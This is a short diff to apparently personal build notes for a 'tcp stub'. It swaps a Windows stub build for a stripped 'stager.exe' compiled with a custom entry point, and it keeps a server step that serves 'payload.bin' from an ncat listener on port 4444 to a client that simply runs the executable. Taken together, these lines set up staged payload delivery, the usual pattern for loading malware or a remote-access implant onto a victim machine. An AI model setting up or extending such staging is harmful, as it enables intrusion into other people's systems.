@@ -8,7 +8,7 @@ tcp stub
 
 ### Commands
 - g++ stub.cpp -o stub
-- x86_64-w64-mingw32-g++ stub_win.cpp -o stub_win.exe -lws2_32
+- x86_64-w64-mingw32-gcc -s -Wl,--entry=main -Wl,--strip-all stager.c -o stager.exe
 - server: ncat -lvp 4444 --send-only < payload.bin
 - client: run executable
 
